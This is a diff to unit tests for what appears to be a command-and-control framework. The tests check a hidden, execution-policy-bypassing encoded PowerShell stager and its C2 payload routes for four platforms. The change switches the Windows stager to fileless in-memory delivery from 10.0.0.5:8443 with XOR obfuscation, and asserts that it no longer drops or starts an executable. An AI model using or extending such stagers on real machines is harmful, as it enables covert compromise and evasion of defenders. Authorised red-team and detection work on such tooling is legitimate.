@@ -22,12 +22,17 @@ class RemoteDropperTests(unittest.TestCase):
     def test_windows_dropper_is_powershell_stager(self):
         d = self._dropper("windows")
         self.assertTrue(d.startswith("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "))
-        # The URL inside must reference the remote module endpoint
+        # The URL inside must reference the in-memory remote module endpoint
         import base64 as b64
         decoded = b64.b64decode(d.rsplit(" ", 1)[1] + "==")
         script = decoded.decode("utf-16-le")
-        self.assertIn("/api/v1/remote_payload_windows", script)
+        self.assertIn("/api/v1/remote_payload_windows_mem", script)
         self.assertIn("10.0.0.5:8443", script)
+        # Regression: the old stager wrote srv*.exe and Start-Process'd it.
+        self.assertIn("-bxor170", script)
+        self.assertNotIn("DownloadFile", script)
+        self.assertNotIn("Start-Process", script)
+        self.assertNotIn("srv", script)
 
     def test_linux_dropper_fetches_remote_payload(self):
         d = self._dropper("linux")
@@ -92,6 +97,7 @@ class RemoteC2RouteTests(unittest.TestCase):
         paths = {r.resource.canonical for r in app.router.routes()
                  if getattr(r, "resource", None) and r.resource.canonical}
         for p in ("/api/v1/remote_payload_windows",
+                  "/api/v1/remote_payload_windows_mem",
                   "/api/v1/remote_payload_linux",
                   "/api/v1/remote_payload_macos",
                   "/api/v1/remote_payload_android"):
